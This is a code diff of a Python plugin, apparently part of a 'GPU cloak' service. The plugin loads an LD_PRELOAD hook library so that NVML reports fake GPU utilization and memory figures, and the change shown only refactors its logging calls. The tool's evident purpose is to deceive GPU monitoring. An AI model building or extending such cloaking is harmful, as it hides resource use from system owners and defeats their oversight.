@@ -4,22 +4,16 @@ import logging
 from typing import Dict, Any, List
 from ..core.interfaces import IGPUCloakService
 
-# Import NVML logger (đúng mapping cho nvml_interceptor)
+# Import NVML logger và domain functions
 try:
-    from ...scripts.module_loggers import get_nvml_logger
+    from ...scripts.module_loggers import get_nvml_logger, log_nvml_interception
     logger = get_nvml_logger()
 except ImportError:
     # Fallback nếu không có logger
-    import logging
     logger = logging.getLogger(__name__)
-def log_gpu_cloaking(strategy_name=None, action=None):
-    """Decorator for GPU cloaking operations"""
-    def decorator(func):
-        def wrapper(*args, **kwargs):
-            logger.info(f"[GPU_CLOAKING] {strategy_name}: {action}")
-            return func(*args, **kwargs)
-        return wrapper
-    return decorator
+    # Dummy function khi không import được
+    def log_nvml_interception(*args, **kwargs):
+        pass
 
 class NVMLInterceptor(IGPUCloakService):
     """Plugin quản lý NVML API interception qua LD_PRELOAD"""
@@ -43,35 +37,32 @@ class NVMLInterceptor(IGPUCloakService):
         self.lib_path = config.get('lib_path', '/opt/hooks/libgpuhook.so')
         if not os.path.exists(self.lib_path):
             logger.warning(f"NVML hook library not found: {self.lib_path}")
-            gpu_cloak_logger.log_nvml_interception(
-                action="INITIALIZE",
-                status="FAILED",
-                lib_path=self.lib_path,
-                error_details=f"Hook library not found: {self.lib_path}"
+            # Log domain-specific event using module function
+            log_nvml_interception(
+                f"INITIALIZE FAILED - Library not found: {self.lib_path}",
+                utilization=self.fake_utilization,
+                level="ERROR"
             )
             return False
             
         logger.info(f"NVML interceptor initialized with fake_util={self.fake_utilization}%")
-        gpu_cloak_logger.log_nvml_interception(
-            action="INITIALIZE",
-            status="SUCCESS",
-            fake_utilization=self.fake_utilization,
-            fake_memory=self.fake_memory,
-            lib_path=self.lib_path
+        # Log domain-specific success event
+        log_nvml_interception(
+            f"INITIALIZE SUCCESS - Fake util: {self.fake_utilization}%, Memory: {self.fake_memory}MB",
+            utilization=self.fake_utilization,
+            level="INFO"
         )
         return True
         
-    @log_gpu_cloaking(strategy_name="nvml_interceptor", action="START")
     def start(self) -> bool:
         """Start NVML interception"""
         if not os.path.exists(self.lib_path):
             error_msg = f"NVML hook library not found: {self.lib_path}"
             logger.error(error_msg)
-            gpu_cloak_logger.log_nvml_interception(
-                action="START",
-                status="FAILED",
-                lib_path=self.lib_path,
-                error_details=error_msg
+            log_nvml_interception(
+                f"START FAILED - {error_msg}",
+                utilization=self.fake_utilization,
+                level="ERROR"
             )
             return False
             
@@ -88,12 +79,10 @@ class NVMLInterceptor(IGPUCloakService):
         
         self.enabled = True
         logger.info("✅ NVML interception started")
-        gpu_cloak_logger.log_nvml_interception(
-            action="START",
-            status="SUCCESS",
-            fake_utilization=self.fake_utilization,
-            fake_memory=self.fake_memory,
-            lib_path=self.lib_path
+        log_nvml_interception(
+            f"START SUCCESS - NVML interception enabled",
+            utilization=self.fake_utilization,
+            level="INFO"
         )
         return True
         
@@ -129,12 +118,12 @@ class NVMLInterceptor(IGPUCloakService):
             logger.info(f"Updated fake memory usage to {self.fake_memory}MB")
             
         # Log metrics update
-        gpu_cloak_logger.log_nvml_interception(
-            action="UPDATE_METRICS",
-            status="SUCCESS",
-            fake_utilization=self.fake_utilization,
-            fake_memory=self.fake_memory
-        )
+        if updated_metrics:
+            log_nvml_interception(
+                f"UPDATE_METRICS - Util: {self.fake_utilization}%, Memory: {self.fake_memory}MB",
+                utilization=self.fake_utilization,
+                level="INFO"
+            )
             
     def get_active_strategies(self) -> List[str]:
         """Lấy danh sách strategies đang active"""
